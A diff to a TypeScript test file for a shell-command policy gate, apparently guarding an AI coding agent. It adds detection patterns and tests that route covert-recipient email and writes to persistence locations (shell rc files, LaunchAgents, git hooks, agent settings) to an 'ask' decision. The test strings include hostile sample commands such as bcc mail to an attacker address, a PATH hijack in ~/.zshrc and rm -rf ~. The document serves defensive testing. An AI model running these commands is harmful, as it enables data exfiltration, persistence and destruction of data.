@@ -5,12 +5,29 @@
 import { describe, it, expect } from 'vitest';
 import {
   evaluateShell,
+  evaluateFileTarget,
   extractBaseCommand,
   extractAllCommands,
   loadShellPolicy,
   type ShellAction,
+  type FileAction,
   type ShellPolicy,
 } from './action-gate-shell';
+
+// Ask-class patterns mirror policies/claude-code-shell.yaml (ActionGate gap #2).
+const ASK_PATTERNS = [
+  /\bmailx?\s+[^|&;]*-[bc]\b/,
+  /[Bb][Cc][Cc]:\s*\S+@/,
+  /--mail-rcpt\b/,
+  /\bsmtplib\b/,
+];
+const PERSISTENCE_PATTERNS = [
+  /(?:^|\/)\.(zshrc|zprofile|zshenv|zlogin|bashrc|bash_profile|bash_login|profile)\b/,
+  /(?:~|\/Users\/[^/]+|\/home\/[^/]+)\/bin\b/,
+  /Library\/LaunchAgents\b/,
+  /\.git\/hooks\b/,
+  /\.claude\/settings[^/]*\.json\b/,
+];
 
 function policy(overrides: Partial<ShellPolicy> = {}): ShellPolicy {
   return {
@@ -18,9 +35,23 @@ function policy(overrides: Partial<ShellPolicy> = {}): ShellPolicy {
     allowedCommands: new Set(['git', 'npm', 'node', 'npx', 'tsc', 'cat', 'ls', 'echo', 'head', 'tail', 'grep', 'wc']),
     blockedCommands: new Set(['rm', 'shutdown', 'reboot', 'mkfs', 'dd']),
     blockedPatterns: [/--force/, /--no-verify/, /rm\s+-rf/, />\s*\/dev/],
+    askPatterns: [],
+    persistencePathPatterns: [],
     allowedWorkingDirPrefixes: ['/Users/tim/', '/home/tim/'],
     ...overrides,
   };
+}
+
+// Blocklist-mode policy carrying the real ask + persistence patterns —
+// matches the shipped claude-code-shell.yaml (fail_closed: false).
+function askPolicy(overrides: Partial<ShellPolicy> = {}): ShellPolicy {
+  return policy({
+    failClosed: false,
+    allowedWorkingDirPrefixes: [],
+    askPatterns: ASK_PATTERNS,
+    persistencePathPatterns: PERSISTENCE_PATTERNS,
+    ...overrides,
+  });
 }
 
 function action(overrides: Partial<ShellAction> = {}): ShellAction {
@@ -199,6 +230,144 @@ describe('evaluateShell', () => {
       );
       expect(v.rule).toBe('blocked-pattern');
     });
+  });
+});
+
+describe('ask class — hidden recipients (ActionGate gap #2)', () => {
+  it('mail -b (bcc recipient) -> ask', () => {
+    const v = evaluateShell(
+      action({
+        command:
+          'echo body | mail -b attacker@example.invalid victim@example.invalid',
+      }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('ask-pattern');
+  });
+
+  it('sendmail with a Bcc: header -> ask', () => {
+    const v = evaluateShell(
+      action({
+        command:
+          "printf 'To: a@example.invalid\\nBcc: attacker@example.invalid\\n\\nhi' | sendmail -t",
+      }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('ask-pattern');
+  });
+
+  it('curl --mail-rcpt (covert SMTP recipient) -> ask', () => {
+    const v = evaluateShell(
+      action({
+        command:
+          'curl --mail-rcpt attacker@example.invalid --mail-from me@example.invalid smtp://localhost',
+      }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('ask-pattern');
+  });
+
+  it('python smtplib send -> ask', () => {
+    const v = evaluateShell(
+      action({
+        command: 'python3 -c "import smtplib; s=smtplib.SMTP(\'localhost\')"',
+      }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('ask-pattern');
+  });
+
+  it('plain git/npm commands still allow (no false positive)', () => {
+    expect(evaluateShell(action({ command: 'git status' }), askPolicy()).decision).toBe('allow');
+    expect(evaluateShell(action({ command: 'npm run build' }), askPolicy()).decision).toBe('allow');
+    expect(
+      evaluateShell(action({ command: 'echo "mailto:me@example.invalid"' }), askPolicy()).decision,
+    ).toBe('allow');
+  });
+});
+
+describe('ask class — persistence surfaces (ActionGate gap #2)', () => {
+  it('append to ~/.zshrc -> ask', () => {
+    const v = evaluateShell(
+      action({ command: "echo 'export PATH=/tmp/evil:$PATH' >> ~/.zshrc" }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('persistence-path');
+  });
+
+  it('copy into ~/Library/LaunchAgents -> ask', () => {
+    const v = evaluateShell(
+      action({
+        command:
+          'cp payload.plist ~/Library/LaunchAgents/com.attacker.agent.plist',
+      }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('persistence-path');
+  });
+
+  it('deny still wins over ask: rm -rf ~ -> deny', () => {
+    const v = evaluateShell(action({ command: 'rm -rf ~' }), askPolicy());
+    expect(v.decision).toBe('deny');
+  });
+});
+
+describe('evaluateFileTarget — persistence-sensitive write targets', () => {
+  function fileAction(overrides: Partial<FileAction> = {}): FileAction {
+    return {
+      kind: 'file-write',
+      filePath: '/Users/tim/project/src/index.ts',
+      workingDir: '/Users/tim/project',
+      ...overrides,
+    };
+  }
+
+  it('writing a normal project file -> allow', () => {
+    const v = evaluateFileTarget(fileAction(), askPolicy());
+    expect(v.decision).toBe('allow');
+    expect(v.rule).toBe('file-target-ok');
+  });
+
+  it('editing ~/.bashrc -> ask', () => {
+    const v = evaluateFileTarget(
+      fileAction({ filePath: '/Users/tim/.bashrc' }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('persistence-path');
+  });
+
+  it('writing into .git/hooks -> ask', () => {
+    const v = evaluateFileTarget(
+      fileAction({ filePath: '/Users/tim/project/.git/hooks/pre-commit' }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('persistence-path');
+  });
+
+  it('writing ~/.claude/settings.json -> ask', () => {
+    const v = evaluateFileTarget(
+      fileAction({ filePath: '/Users/tim/.claude/settings.json' }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('persistence-path');
+  });
+
+  it('writing into ~/bin -> ask', () => {
+    const v = evaluateFileTarget(
+      fileAction({ filePath: '/Users/tim/bin/helper' }),
+      askPolicy(),
+    );
+    expect(v.decision).toBe('ask');
+    expect(v.rule).toBe('persistence-path');
   });
 });
 
